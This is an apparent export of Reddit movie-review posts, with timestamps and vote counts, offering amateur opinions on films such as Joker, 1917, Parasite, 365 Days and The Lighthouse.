Wasn't this about somebody's cancer treatment or something? Like an indictment of shitty US Healthcare? Fuck. I can't believe I wasted so much time writing this... but it's my duty to make sure no one watches this movie.

1620649099.0,Saw Retrospective: The Series is Very Well Done and Doesn't Get Enough Credit!,"Hey-yo, are you a fan of the Saw films? I feel like they're looked down upon for being dumb or too violent but personally I think that they're really underrated. The first couple aren't THAT violent either and focus way more on the mystery element and play out more like a thriller than a horror, and the further sequels get super wrapped up in plot - Yes the traps become the centrepieces but I don't think the films overall get enough credit for everything else that's going on around them. They're mostly really well crafted investigative type movies that somehow keep surprising you freakin' 7 sequels in! Clearly I wasn't the only one that enjoyed them judging off the crazy amounts of money they made throughout the 2000s but even still I believe they're hugely underrated. Now, I'm not saying you can't pick them apart in certain ways and they're definitely a bit silly and trashy too - but I think they're well written enough to justify their existence and I enjoy every single one of them. The original is the best, saw is the worst and all the others are... Pretty great. 

Anyone else have favourites? Or do you just hate them all? (And if so why? Because there's two sides to that I think: there's the people who think they're too violent and don't know much about them. And there's the people who look down upon them as being stupid and convoluted, which in some ways is fair criticism I won't lie hahaha) 

Anyway so also I've made this video essay which is gonna be the first of 3 parts covering the Saw series leading up to Spiral.

Why is no one talking about how terribly cheap and amateur this film looked, the cringingly unnatural dumpster fire of a script, or the excruciatingly stagnant pacing?

I can’t even begin to list off the *many* incorrect artistic choices that this film made and yes, I thought art was subjective but this film taught me that some art choices can simply be the wrong ones.  

Baseless characters, loose ends, bad casting, horrible direction -- I really felt as though this movie prided itself on wasting viewers' time.

1570644678.0,My Joker movie review,"So I went to see the “movie of the year” yesterday. I went at 12:05, sat through some previews saw Star Wars Episode IX, Birds of Prey and other fun trailers. I always go to the movies early so I can see these. I can’t wait for Star Wars and that trailer got me hyped up for that galaxy far, far, away...but then the actual feature began. 

During that 2hr and 2 min long movie, that excitement became a suspenseful feeling. I watched with suspense, amusement, horror, and some reflection. This movie was incredible. Truly a definite piece in Joaquin Phoenix’s career. This movie has caused many walkouts, and has received a good amount of hatred for being too dark, grotesque, or for glorifying violence. Here’s what I saw, I saw a man in this movie living with an illness. This illness slowly consumes him. This movie touches the dark areas of mental health that people who haven’t been there dare not venture down. I admit, I’ve been there. I have had everything go wrong that possibly could and have lost myself in that process, same as Arthur does. 

There is A line in this movie that says “the worst part about having a mental illness is people expect you to behave as if you don’t” really strikes a nerve with me as it does with countless others. As someone who works in the medical field, it has always been “uncool” to talk about your feelings, what you think, or how something affects you. If you think that still, this movie isn’t for you. But for those of us, who have been on the dark road, who see no end in sight, go see this movie. Go sit, eat your popcorn, drink your soda and enjoy this work of art. Watch the tragedy of Arthur Fleck and then look at your own life, it’s truly an enlightening experience. Joker is a cinematic masterpiece, for those who understand its significance.",moviereviews,1800,329,50,0
1576660033.0,“What a fuckin’ film” Film Review: 1917,"[Read it on my website here.](

What a fuckin’ film.

1917 completely blew me away. An absolute thrill ride of a movie, both tense and emotional. Recent film discourse has spoken of certain films not being cinema but rather “theme park rides”. In the best possible way 1917 felt like this. Not to its detriment and not in any way that would mean it’s not cinema. I was completely drawn in and wilfully dragged along for one hell of a ride.

The film is a WW1 drama that’s a simple narrative about getting from point A to point B. It’s shot to appear as one 2 hour long take. This gimmick (wrong word but it is a major selling point) is what really adds to the experience of this film. Although you can see the joins between scenes your ever presence in this world just builds into this insane intensity. Your in real time with the characters and completely invested in their mission.

The film is reminiscent of films like Gravity (2013) and Avatar (2009). Movies that are these huge spectacles where going to see them is an experience. 1917 is honestly the perfect advertisement for the necessity of cinema. Though I will be buying this on UHD sometime next year, watching this film on my couch is will not be the same as having seen it at the movies. If this had come out on a streaming service or made as a limited series the whole feeling that it evokes probably would be undermined.

Director Sam Mendes has crafted a small story on a large scale. The simplicity of the story and its singular focus allow it to be about so much more. You see the horrors of war, the toll it takes on those who fight it and the impact it has on the world it’s fought on. The film is based on stories told to Mendes by his Grandfather Alfred and this grounding in truth is such a strong component of this film.

If Roger Deakins doesn’t win a Oscar for this movies cinematography then there is truly no justice in the world. Hopefully every award is, lovingly, thrown at Deakins. This film is a true marvel. A technical achievement that deserves acknowledgement. The way it’s shot is something to behold and it’s a big reason why this film works so well. Without the combined efforts of both story and technical precision the movie would fall apart, so Deakins’ work is intrinsically important.

The two main leads in Dean-Charles Chapman and George MacKay are as great as you could ever hope for. They sell the situation, sell the fear and sell the courage. They were completely believable as these two young men in that hell of a war. The supporting cast in Andrew Scott, Colin Firth, Mark Strong and Benedict Cumberbatch are also wholly wonderful. The decision to cast bigger names in these smaller roles was a smart idea. The actors added weight to scenes and characters that otherwise wouldn’t have felt the same. Amongst the chaos they added grounding and something for the audience to hold onto.

I can’t speak more highly of this film. I loved it. The film resonated with me on a personal level and my predisposition to enjoy war films probably helped as well. But judge for yourself. I’d be shocked if you didn’t find something in this film that spoke to you.

I’ll begin as a I started…

What a fuckin’ film:

1628394778.0,Why Jungle Cruise Sucks,"Jungle Cruise is the Most Uninspired Movie of the Year

Why it sucks
1- Dwayne “The Rock” Johnson is playing a version of himself that fails to impress on every level. The writing, the failing performance, and none of the hammy excellence that makes him the best part of the Fast Franchise all combine to make a character with as much sophistication as a WWE wrestler from 1998 smashing his head into a wall. His character is so lifeless and forgettable that starting at paint dry would have a more engaging character arc.
2- Indiana Jones Lite
For my audience alive for Indians Jones and the Raiders of the Lost Ark, be grateful. You have basically watched this movie already! Imagine a world where Pirates of the Caribbean and Indiana Jones had a baby, but it was lacking a heart and soul. Now, stop imagining it because thanks to Disney, you live in this thankless world. If you thought 2021 was bad, the best summary of the year is the depressing dumpster fire that is this movie.
3- The Plot
I solved the main conflict of the “film” in less than 10 minutes. Obviously, this white English man kills Dwayne Johnson, and finds the magical “Tears” that Emily Blunt’s character searches for to validate her career. Unfortunately, the onscreen tears cannot match the collective tears of the audience who wasted $30 to watch this in their home.
In conclusion, this movie sucks, and I know this because I watched nothing but the trailer and a 5 minute review on YouTube in the background of a much better movie, The Green Inferno. 2/10",moviereviews,1532,272,25,0
1579068279.0,Parasite Review,"Rating: The perfect 10 


It isn’t every day that you come across a movie like this, a practically flawless one in my opinion actually. I have nothing but praise for director Bong Joon-Ho and I can now see why this movie has received much hype and praise over the past few months. This is a movie which not only shows a contrast between the rich and the poor but also the human condition and the will to survive. Don’t worry, this review won’t have any spoilers whatsoever. 


To begin this praise train I have to first and foremost praise the acting of lead actor Choi Woo-shik whom delivered an incredible performance throughout this movie and brings a sort of charm during the first act of the movie.Another standout would be Kang-Ho Song that remains a recurring cast in the movies directed by Bong Joon-Ho and his consistency in the various movies he has directed absolutely shows why the director has so much trust in his acting capabilities. 


A transition scene in particular which occurs at the end of the second act is really a beauty in itself and the transitions were absolutely stunning and beautiful which brings me to the cinematography and movie editing of the movie. The pacing was consistently on point where everything, even the change in tone is seamless. Along with the cinematography in which this movie is beautifully shot from the aesthetically pleasing rich kid house down to the semi-basement house in the suburbs. 


Furthermore, another beauty of this movie will definitely be the score which was composed by Jung Jae-il which manages to convey emotion and tension during the second and third act of the movie which is something truly remarkable. Through music there are also hints to the sudden sort of change in tone I shall say which begins within just about the middle of the second act of the movie. 


The plot of this movie is something I’ve yet to see over the many years of watching movies and this is where praised should be absolutely given for this ambitious plot where I could simply say, nothing written and the direction of this movie which keeps you guessing as to what this movie really is about should you dive deeper than the way the movie was promoted within the trailers shown for it. It is nothing short of extraordinary as you are unable to really see the change in tone coming. 


At the end of the day, this movie questions how the rich could help the poor and in fact portrays mankind’s strive for survival which in this case would be a better life in such a way that it isn’t in your face. Plus, by the end of the movie, you really realise there is no real protagonist or antagonist, just people. People trying to live a happier life. 


Thus, making Parasite the perfect movie where I am unable to criticise a single thing in this movie. Director Bong Joon-Ho has definitely earned my trust in his artwork and should to some extent be placed amongst the greats. ",moviereviews,2919,516,29,0
1591653239.0,*SPOILER* 365 Days... Could have been 2.5 Days," I just noticed this movie yesterday on Netflix Canada and gave it a try since the leading man seemed hot... That was my first mistake.

The lead male character is indeed hot, but not much else is worth watching in this movie. I watched it yesterday, and my brain is still mad at me for giving it such garbage to digest.

The plot makes absolutely no sense from the start. It feels like this was a collage of 5 different people’s first draft ideas, put together by the lowest bidder. Here's just a few particularly bad parts of the script (not exhaustive list, it would be too long):

* Massimo seeing Laura on the beach with his binoculars, only to be haunted by this image after being shot. He had seen her a few seconds with binoculars but somehow he had a good enough recollection of her face to have her portrait made (in his bedroom!), and it is as good as a picture would have been!
* When Massimo finds Laura, he just decides to kidnap her instead of trying to seduce her. This is weird because they make it clear from the start that her boyfriend is a schmuck. If Massimo had just opened the door of that car and asked her if she wanted a drink she’d have happily jumped in, without looking back.
* The “weak heart” thing is lame. Nobody seems to think about that anymore when she’s bouncing on his d\*\*k for a whole day on that yacht... (where’s his associate gone by the way?)
* The shopping trip he takes her on is ridiculously long and pointless, as if scripted by a 16yo
* He tells her he wants her to fall in love with him yet holds her captive for no reason, really... Her “rebellion” against him is unconvincing at best. And very quickly it is understood that she’s trying to seduce him. The film is named “365 Days”, it could have been named “2.5 days”, as it is about as long it took for her to loose herself in him completely.
* His behavior is absolutely ridiculous for such a (supposedly) successful mafia boss. The scene in the bar where Laura decides to be as slutty as she can, without knowing who she was dealing with is absolutely stupid and hard to watch. Him becoming completely unhinged and shooting some guy's hands (it is said) makes no sense...
* They introduce Anna, the ex girlfriend, for no reason and lead us to believe Massimo killed her, as asked by Laura. That’s ridiculous and wrong on all levels. It just feels they had this idea of introducing the ex girlfriend, immediately regretted it and killed her to get themselves out of this plot blunder.
* And finally, Massimo... he’s extremely handsome, that’s a given, and it’s nice to have him paired with a less attractive partner. (Oh, she is beautiful, but more in a girl next door kind of way). Anyway, as per the sex scenes, we have to fight really hard to get over the extremely bad dialogues preceding them. Everything they say to each other is cringeworthy (and don’t even get me started on the extremely bad bdsm sub/dom attempt), and you have to forget it to enjoy seeing them going at it.
* The ending feels like it's been thrown together like a dinner made of last week's leftovers, topped with ice cream, with a side of raw onions. In other words, a complete mess... 

I’m sorry, I have to stop here, but it doesn’t even start to describe how bad this movie is. I feel like I've been robbed 2 hours and a good number of neurons...",moviereviews,3333,619,85,0

1651653798.0,Dr Strange MoM (Non Spoiler Review/Discussion),"This movie is the epitome of absolutely acing the hard questions on an exam, and then getting the easy questions wrong.  

Some thoughts below:  

1. The score and the sound design was so freaking good. Honestly this movie is worth the watch for the soundtrack alone  

2. The highly anticipated visuals, VFXs and cinematography delivered for the most part. But, its also rather annoying that in some parts the simplest of effects and greenscreen backgrounds are done so poorly. Sometimes I swear i could see the greenscreen borders lol.  

3. The dialogue is very early days MCU. Personally didnt like it.  

4. Benedict Cumberbatch was great but this is Elizabeth Olsen’s movie. What a performance by her👏Not sure how i felt about the new character Xochtil Gomez..pretty mediocre debut tbh  

5. Imo, the cameos were given pretty uninspiring parts. Sometimes, i felt like it was borderline cringe and just for the sake of promos.  

6. The horror? Did not jump once tbh. Didnt mix well with the forced comedy too.  

7. There was next to no stakes in this movie. Complete opposite of Spidey FFH.  

8. Idek what to say about the storyline tbh..it did its job i suppose.   

Overall, i thought it was aight. Elizabeth and the score carried hard. VFXs were amazing. 6.5/10 at best.

It shows a society finally snapping after being stretched beyond their limits. Their sick, their tired and gap between the elitist and the ""others"" are growing. 

It's a mirror to society. Funnily the same real qorld society that's currently throwing a fit over a movie.  A society so corrupted an bewildered by their many issues that they don't seem to function properly anymore.

Im just not sure if I liked this movie or if I wasted my money. The begining was good. The movie was beautifully shot and the scenes we're composed wonderfully. I was genuinely interested the entire time, especially when the dopplegangers came on screen. However the payoff was not worth it at all.  Everything about the dopplegangers felt like an unfinished thought. Like Jordan didn't have enough time to go into details about certain things. There's nothing wrong with ambiguity but it's falls short when you half explain it and then never revisit it. And goddamn the fucking movie itself is so pretentious! As far as the social commentary goes it's skin deep as fuck. ""We are our own worst enemy"" is the same shit everyone has been saying since the fucking trailer dropped. It hardly touches on anything that isn't obvious as fuck. There's a little bit of commentary on class differences but it hardly goes anywhere because 

[SLIGHT WARNING] all they do is fucking stab people with scissors. 

The explanation behind all of  this is fucking stupid. When you get to the climax and the big secret behind the clones are brought to light; I found it extremely underwellming. It only went on to raise more questions about the actual plot; We know we know where they came from... But why???

Those are just some of my thoughts.

Monte Carlo is my comfort movie. Grace who is not popular in school graduates High School. The only thing that kept her going in the last four years were her trip to paris after graduation. She hopes Paris will change her as a Person. Someone she likes more than herself now. Her Step sister hates herself. Throughout the movie she becomes more carefree and actually experiences new things. Graces Best friend always thought a wealthy life is what makes her happy, in paris she lives a wealthy life for a few days and realizes that the wealthy life is not for her. Instead she realizes to be grateful for her fiance. 

Its a sweet movie. I see myself in Grace and her step sister. I feel like for Grace High school wasnt the best time of her life and that she felt lonely so she hold on onto the idea of paris changing her. I like this movie because it doesnt portray her high school self as the defining thing. In the end of the movie she finds something that makes her truly happy, which is helping under priviledged children. And meg she is the type of person to say no even tho she really wants to say yes. In Paris she started opening up to other people and saying yes more. She started being spontaneous and she likes herself now.",moviereviews,1304,244,20,0
1606906513.0,Fractured is a great movie that got trashed by reviewers," I watched was 'Fractured' which received a rating of 6.4. Going into the movie, I didn't expect much and had my hopes low for two reasons: it's a movie by Netflix, IMDB ratings are usually accurate and its rating is subpar. However, I watched it, and gotta say, it went way beyond my expectation and is now one of my favorite psychological thrillers. But the 6.4 rating left me confused. Yes, the movie had its weaknesses but I would've expected at least a 7.5 from IMDB. I investigated by reading some negative reviews which dragged the ratings down. Many made no sense at all. There were many very low ratings in the 4s and 5s such can be summed up to ""The last 5 minutes was bad"" which is logically flawed as I will explain. There are countless reviews like this: [

Rating the movie down by criticizing the last 5 minutes makes no logical sense. It is tricky to explain, but try to follow along and allow me to explain. This is because the movie would've been, **objectively speaking**, much worse if the last 5 minutes did NOT happen. 2 main elements:

*- The protagonist behaved very awkwardly and interacted strangely with his wife and daughter (which I first assumed would be because of bad writing, as I expected from the low rating* *which could be explained if only the protagonist was crazy.)*

*- The behavior of the doctors is filmed to be ominous and dark, almost to a cringeworthy degree (which again, I first assumed would be because of bad writing. The last 5 minutes perfectly justifies the overly portrayed ominous doctors as it is revealed that the main observer is crazy.)*

The reviewers who claim that ""the last 5 minutes ruined the movie"" must mean that the movie would've been better if the last twist did not happen. Which is ridiculous because it would mean:

*- The very awkward interactions between the protagonist and wife are real interactions (terrible writing if real.)*

*- The overly ominous doctors and hospital workers are actually the villains (cringeworthy writing if it's an actuality.)*

Objective statements aside, I believe the reviewers who downrated this movie using this rationality let their desire for a feel-good ending get in the way and unfairly downrated a solid movie. (Yes there are very highly rated movies with dark twists like 'Seven' but unlike 'Seven', people weren't anticipating a good ending until the last 5 minutes). It would've made much more sense if the 6.4 rating of the movie was dragged down by people who didn't enjoy the movie for logically sound reasons, or found a lack of quality in other ways, but rather, people let their emotions get in the way and spammed negative ratings with no sound reason.

This is reflective of a bigger problem. Which is basically, emotions and other unsound reasons (could be a desire for a feel-good ending, moral agenda, political view) destroying the accuracy of the rating system which should objectively reflect the quality of a movie. There are countless examples, but here is a few popular titles that people can relate to:

*- Downvoting Joker because it would inspire violence*

*- Upvoting Black Panther because it is the first all Black cast superhero movie (and wtf people actually like the ending when Killmonger had a positive moment with the hero when he was dying which makes no sense because Killmonger should've been pissed off as he wasn't able to complete his goal that he worked his whole life from? And he's overly calm when he dies at the hands of Black Panther who's the son of the guy that killed Killmonger's father?? excuse my rant)*

*- Downvoting Aquaman because of Amber's personal S\*\*\**

*- Downvoting Mulan because some CPP S\*\*\* that has nothing to do with the quality of the movie, etc.*

The rating system should be an accurate reflection of the quality of the movie, not unrelated b s. I'm not sure what I am trying to accomplish typing all this but just wanted to express my frustration. Please let me know if I am wrong, would love to discuss, or hopefully, incite sort of change to the IMDB rating system?",moviereviews,4055,703,90,0

1561224923.0,Godzilla: KOTM (2019),"Maybe I'm a bit too late (because I just found out about this subreddit), but, here's my review for Godzilla KOTM. (SPOILER)

My rate for this movie is 8/10. Yes. That high. As a monster geek, this movie maybe is one of the greatest monster movie of all time if not the greatest. But for me, this movie is the best. From storyline to visual to hint that they put on this movie is awesome.

For the storyline, it's not really hard to understand the hatred of the main characters toward the godzilla after all he has done (it's basically like the aftermath of Man of Steel where Batman got really angry at Superman for causing all the havoc). Then, I think it's a good move from the director which he showed that human took godzilla as an animal/beast but later on became a more powerful and higher organism than just an animal. The part which make me deduct the rate are the security which the girl easily take the ORCA from mercenaries and how does she's not being hit by Ghidorah's lightning. Of course it was for the plot, but, that's just me. hahaha. I'm not gonna put all the detail here 'cause that would be too long for others to read, but, overall, the story is good. It's all lead to something. Open up to some possibilities. The relation to next story (Godzilla vs Kong) is also there, the hint about who's the next villain (possibly) is(/are) there. 

For the visual, it was very very very satisfying to look at all those monsters fight each other! It was visually stunning! Not much to say about it.

This movie is enjoyable from the start until the end. Not much time for me to take my eye off of the screen. This is my first time posting a review, maybe I'm a bit biased because I'm a monster geek, sorry about that. Just want to share my love for this movie.

1637772967.0,The Lighthouse (2019): 10-Category Review,"The Lighthouse is a tour de force. It is truly a film for cinephiles because it combines every aspect of elite moviemaking. First, the writing is amazing because the story is so contained, yet so thematically dense. It's incredible how one location and two characters can deeply (yet seamlessly) explore identity, sexuality, sanity, and isolation. Meanwhile, the mesmerizing pacing of the story is perfectly disorienting, serving the decay of time and descent into madness. On top of all that, Robert Pattinson and Willem Dafoe are both electric as they disappear into their exotic roles.

The Lighthouse is also flawless from a technical perspective. With its coloration, aspect ratio, and lens choices, the cinematography is a juggernaut. Every image is a work of art, composed with meaning and skill. Next, the sound design is relentless, constantly building tension with ominous weather and mechanics. The production design is meticulously detailed (even going so far as to build the actual lighthouse setting themselves). Finally, the music ties everything together, creating an atmosphere of dread and psychosis. All together, Robert Eggers has constructed a profound experience with extraordinary vision. The Lighthouse is a symphony of filmmaking and a genuine masterpiece.

1582814979.0,Sam Mendes' 1917 - One of the Most Beautifully Shot Films Ever!,"What a breathtaking and spectacular film!!! Sam Mendes' 1917 is the best war film since Saving Private Ryan (1998), in fact it is at par with it. 1917 is not just a movie, it is a cinematic experience and majority of the credit for this goes to the legendary cinematographer, Roger Deakins! I mean the direction was excellent, the screenplay was also quite good but the cinematography of the film was class apart and among the best I have ever seen. 

The film was made to look like it was shot in one continuous take, though obviously there must have been various invisible cuts which even the most hawk-eyed viewers won't be able to make out. But that's not what special as Birdman (2014) did the same; what's special is doing so in a genre like War Drama and that too with such perfection! You see, incorporating action, thrill, destruction and horrors of war within limited camera movements and cuts is more than just applaud worthy. It something never seen before and it would have been a punch to the guts if the Academy would have chosen someone other that Roger Deakins for his well deserved Oscar for the same.  

With a goosebumps inducing score by Thomas Newman, 1917 also has one of the best sound designs. In a war movie, especially, sound matters a lot and the film has brilliant sound mixing as well as flawless sound editing. I am not kidding when I say that you are literally transported to the battle field while watching this film, all thanks to its amazing audio and visual appeal. Talking about visual appeal, apart from the world class cinematography, 1917 also boasts powerful practical visual effects and a highly impressive production design which I will get back to later.

1579692383.0,My Joker Review (spoiler free)," 

Joker Review: 

This must be one of the most difficult movies to review as its so many things in one experience.

This is a movie for so many different people.

For the die hard comic fan, you could not ask for a better movie for the Joker. The Joker famously does not have a definitive origin story, playing it off as always having said, “If I am going to have a past, I'd prefer it to be multiple choice” this is shown with the brilliant use of ‘it’s a dream or a not dream’ staging with key sequences. Highlighting his mental illness, something I found that resonated as I suffer from ADHD, I wander off sometimes into daydreams in the middle of conversation (people who don’t know me find this rude but people who know me know it’s part of who I am). The depiction hit unsettlingly close to home with its delivery on screen. There is honestly not much in the way of telling you it’s a comic book movie other then a few names and places you would not know unless you were familiar with the source material. It’s so grounded in reality you are left wondering if it is a comic book movie and not just a physiological thriller! Yet those little nods and Easter eggs to the original source material which weave their way into the story will bring a much bigger impact for those who can recognize them.

For the cinematographer, its shots and use of colours and visual metaphors is breath-taking. From the struggle of Arthur (Joker) to climb the stairs to his home in darkness representing him trying to keep sane, to his happy dance down them in full light bathed in bright tones showing his fall into madness. The shift between the dream sequences in his head being brighter and more colourful, followed by the dark tones that take over when he snaps back to reality. A change that the movie uses to slowly get brighter and more colourful the more he descends into madness.

For the political, it shows a very scary decent into chaos as commentary from an unempathetic society to the cut off funds to the venerable. To advantages taken of the meek by the powerful because it gets them rewards without consideration of the damage it does to those they shine in the light. It serves as both a terrifying celebration and warning of the failure of people in society who lack empathy to those in rough places around us and what those long-term effects are. The film is scary not because it’s graphic with its violence, but because how close to reality it sits. The line is uncomfortably in sight. And that’s where it draws its biggest squirms in the cinema seats.

For those looking for a good movie, little touches like every time there was laughter in the cinema, it was always at the shock of something so horrific or awkward. You felt twisted inside, just like the Joker. It was dark humor played with the most uncomfortable perfection.

I read The Times critic Stephanie Zacharek said about this movie “Arthurs (Jokers) observation(s) is one of those truisms that so true it slides off the wall” and there is a point early on where the film feels like it starts throwing these in your face as what could be seen as cheap wins for social commentary. But I believe that critic lost her interest in the film at this point because unlike other movies which do similar things for easy points, Joker takes the time to develop them and they are absolutely central to understanding his situation and the dominos that fall to bring him down. They are placed in the back of your mind, and then played like a fiddle to shift that uncomfortable feeling in you when horrific actions take place on screen. They whisper in the back of your head, reminding you just how close to reality this could all be. And that’s the frightening thing about this movie. It lasts like a terrifyingly real nightmare that you have to catch your breath from when you wake in the morning. You know its not real but it hangs over you like a shadow for the rest of your day. Joker is that nightmare.

This is a film that looking at its parts should not work together. And yet they are twisted and conducted with the most sinister of beauty. Joaquin Phoenix had the weight and pressure of playing one of the comic mediums most infamous villains that has lasted the ages.  
He rose to the occasion, and as a result Joker deserves a spot in film history as a mirror of our scary, chaotic… and completely mad times.",moviereviews,4378,795,55,0
1579625760.0,The Garden of Evening Mists Review,"My Rating:

8/10


As a Malaysian myself, it was odd watching such a well made film; in fact I would go as far as to say that I am equally astonished and blown away by this movie as it was just so darn good. Well, the movie has been called a heartbreaking love story, although that is true in a certain manner, I think the more proper branding of the movie would be self-healing. 

Firstly, I must acknowledge the themes thrown around in the movie, and to me personally it would be the anger and the hatred towards the Japanese post WW2, and as an individual whom has grown up knowing that Japan were known as some of the most respectable and polite individuals on the planet, I found it hard to understand the hatred that was shown towards them still amongst the Chinese community and after viewing this movie I can say that I can kind of see the anger and resentment felt towards them still. But yes, as mentioned before this movie is about self-healing so in the end, we can't continuously allow the past define the way we see life or how we treat others; sure, there are some few rotten apples here and there but the sample size is simply unsuitable for us to judge an entire community based on the few experiences that we have lived through. Thus, the importance of love, mercy and grace. 

Okay, on with the praises I have regarding this movie. Cinematography is incredible, my gosh what a beautiful movie. However, I believe that it is so mainly because of the location the movie was shot too and these scenes revolving around the vast environment of Cameron Highlands aren't exactly artistic shots but the imagery within the Japanese house where the garden is located is absolutely stunning. 

Although the movie looks stunning, I must bring attention to a certain scene within the movie where the scene could've been better shot which is the scene where the main character, Teoh Yun Ling ponders upon her sister's photograph and the scene plays out in such a way that it felt unnecessary to have a close up on the picture again as it had been done in the earlier part of the movie and the next cut is of her reacting to that picture. This probably isn't an issue for the vast majority but it felt unnatural to me and it stood out too much to my liking. Furthermore, the first 15 minutes of the movie felt choppy to me, this could've been a personal nitpick. 

The acting on the other hand, this is a difficult one to comment upon as it was good but as this movie was labelled as a romantic movie, I went in expecting some serious chemistry between Teoh Yun Ling (Angelica Lee) and Nakumuara Aritomo (Hiroshi Abe) and since this movie focuses on the pain Angelica Lee's character, Teoh Yun Ling experiences during the Japanese invasion of Malaya during WW2, there is constant tension between the two characters due to her prejudice against the Japanese people. But looking past all that, I must say that she did a wonderful job portraying a strong character but at the same time broken, she absolutely nailed all the emotions required in each particular scene and her performance truly nailed this movie home and even brought me to tears.  

All in all, this was a heartbreaking movie, I went in with some form of expectation after seeing the number of awards it was nominated for at the 56th Golden Horse awards and this movie definitely delivers and this is a movie worth catching in the cinema. ",moviereviews,3406,613,52,0
1578678597.0,Drilbit Taylor (2008) review,"So this movie is a big part of my childhood, it was always on TV growing up and when I saw this movie on the 'popular on Netflix' section I just had to rewatch it after some years of not seeing it and review it. 'Drillbit Taylor' was directed by Steven Brill and stars Owen Wilson as Drillbit, Nate Hartley as Wade, Troy Gentile as Ryan and David Dorfman as Emmit and follows the plot of three kids who have just started high school recently and are being bullied by the older kids. In all honesty, if I was one of these kids these bullies wouldn't last long. Imagine being bullied by Josh Peck LMAO... Anyway they hire a bodyguard: Drillbit Taylor, a mysterious man who claims to be a US army veteran and convinces Wade, Ryan and Emmit to hire him for protection against these bullies. You can tell straight off the rip that this movie doesn't take itself seriously but nonetheless its a really fun movie. Some of the jokes don't quite land but I found myself laughing and chuckling many times throughout the movie. the kids in movie obviously have good chemistry and work well together, my favourite being Troy Gentile playing as Ryan. I think he has the best jokes and delivery in the movie and was the perfect person for the role. Owen Wilson even has his moments which is surprising because of his roles in the past but I think he did moderately well in this movie and was able to embody this role. A nice sub plot in this movie is an on going argument between Drillbit and his friend Don who is played by Danny McBride who tries to convince Don to steal from these kids. As the movie goes on, Drillbit becomes more and more attached to these kids and it feels like a genuine connection. It feels real. I like Danny McBride's performance in this and he's really good in this movie but I kinda wish that they put him in the movie a little more, I feel like there was some potential in his character but one of my only problems with this movie is that they didn't do much with him. Another sub plot in this movie is Wade's pursuit of a girl that he's just met but they don't do much with that throughout the movie so I just didn't care much about her character to be honest. My only other problem with this film is that some jokes are a little cringey and the movie would've done better without them but other than that, I think this movie is quite good and light hearted. I would recommend this movie for when you're bored and don't know what to watch. I'm gonna go Chris Stuckmann on this movie and grade this movie a B+.

1658159532.0,Why Over the Hedge (2006) is underrated,"


I’ll admit: it’s been years since I’ve watched this movie. I remember when I was a kid, I loved this movie, and even had the video game on PlayStation 2. I also had a few toys too and would spend hours playing both the game and the toys. I also remember getting the movie on DVD when it first came out, but I lost it. Many years later (in fact, a couple of weeks ago) I found the movie at a 2nd and Charles and I had to buy it. When I got home and put the movie in my DVD player, the memories came flooding back. While I still like the movie, there are a few things that don’t really work when you watch it as an adult. 

Pros:
* The characters are likable. I generally like these characters. They’re fun, and the voice actors do a great job at bring a lot of energy to the characters. The three villains are equally as fun and memorable. (It’s kinda interesting how this movie does a better job at handling three villains than Spider-Man 3 or The Amazing Spider-Man 2). Speaking of villains, my favorite character in the movie is the Exterminator. His lines are so funny, and Thomas Haden Church brings so much joy to this character.
* The story. I’ll admit: I’m a sucker for movies that feature talking animals that are the main characters. (If they’re done right, that is). The plot of this movie kept me engaged and made me care about these characters. While it’s on my mind, let’s talk about the liar reveal trope. In most DreamWorks movies, it’s done to death and doesn’t work all the time. Even I get tired of them from time to time. In this movie, I feel that it works. Let me explain: The main plot centers around RJ, who owes Vincent a lot of food, and has to trick the other animals into gathering food for him. Why I think this trope works for this movie is that during the scene where the RJ is revealed to be a liar, you can feel emotion behind the character. RJ actually found a family with the other animals. This also plays into why I think the characters are really fun in this movie.
* The soundtrack. The songs in this movie were not only made for the movie, but they are really fun to listen to, and you can often catch yourself humming to each tune. My favorite tune on the soundtrack is “Rockin’ the Suburbs”.
* [This scene.]( (Kinda amazing how the makers of the first Sonic the Hedgehog movie looked at this scene for inspiration and not the Quicksilver scene from X-Men: Days of Future Past).


Cons: 
* While some of the jokes in this movie work really well, there are some that don’t work.
* Even though I really enjoyed the characters, I feel as though some of the other animals don’t get a lot of attention. I would’ve liked it if they spent a little longer with them.


In conclusion, this movie was still as good as I remember, but you start to notice a few things once you get older. While I still think this movie is underrated, it’s not as underrated as say, Megamind or The Transformers: The Movie (1986)

1656885305.0,Minions: Rise of Gru honest review,"This movie is a masterclass coming of age film and expertly delves into the introspection and social maturity realm. Throughout the film, Gru is seen to transform from a childish fanboy to a personable juggernaut. The minions are seen to add depth to each part of Gru’s personality that eventually lead him to succeed in his darwinistic villain society. Bob clearly appeals to pathos, raising emotional vs. logical conflict that Gru desperately needs to keep — prevalent ever since he accepted the minions. Kevin emphasizes the need for confidence and leadership that Gru, in his simpish form, lacks. Stuart adds layers to said confidence, using style and swag to initially intimidate opponents. Otto, an addition to our beloved big 3, makes his debut into the despicable me universe with a passionate and heartwarming adventure into the roots of Gru’s motivation. Otto begins the film determined to satisfy Gru’s request for the necklace, which is in turn to satisfy Gru’s idols in the Vicious 6. Otto chases the necklace through treacherous and seemingly impossible conditions with grit and tenacity just to find out that the keeper would give it to him for free. This monumental scene illustrates the overarching theme of the film: trust in others, going solo will only get you so far. Otto’s character development places him front and center on the minion ranking, topped only by Bob. Otto is not seen in the original trilogy and with his size, it can be assumed he perishes from diabetical and cardiovascular complications. Gru simultaneously comes to Otto’s realization when he rejoins his minions and accepts Wild Knuckles as a mentor. Gru grows personally as he sees nothing to prove to his “idols”, he would rather grow with trusted friends and acquaintances to achieve his sinister intentions. Minions: Rise of Gru is a dazzling victory for illumination and I have no doubt any future entries will offer maintain the same level of brilliance.",moviereviews,1952,322,30,0
1650807724.0,I Can't Get Excited for Movie Trailers Anymore. Can Anyone Relate?,"Movie trailers are a massive part of being a big movie fan. They garner interest, they build up hype and they act as essential promotion for every new title coming our way - But as a big movie fan I feel the need to ask: Do you care about them?

See there's many reasons I usually choose not to watch movie trailers from ""they show too much"" to ""theyre misleading"" but the main reason for my typical disinterest is honestly that I'm so sick of the EXTREME HYPE for literally EVERY SINGLE THING that ever releases. It's this absolute excitement on everyone's part that I can't seem to keep up with a lot of the time and I wonder if this idea resonates with anyone else?

1646426827.0,"The Batman- Dark, Gripping, and Real Joy Ride","The Batman 

Dark and gripping. Reeves really showed a side of the Batman that none of the versions has ever shown. He was dark, had his demons and everything in life didn’t see like a playboy billionaire it was a very humanizing side who knew being the Batman was the only thing he cared about. 

The fight scenes were not over done and Reeves placed them perfectly throughout the movie. The tie ins about The Wayne’s and the Arkhams was interesting- the Thomas Wayne inadvertently killing by wanting to protect his wife’s image and not being the “ideal” human was a nice twist.

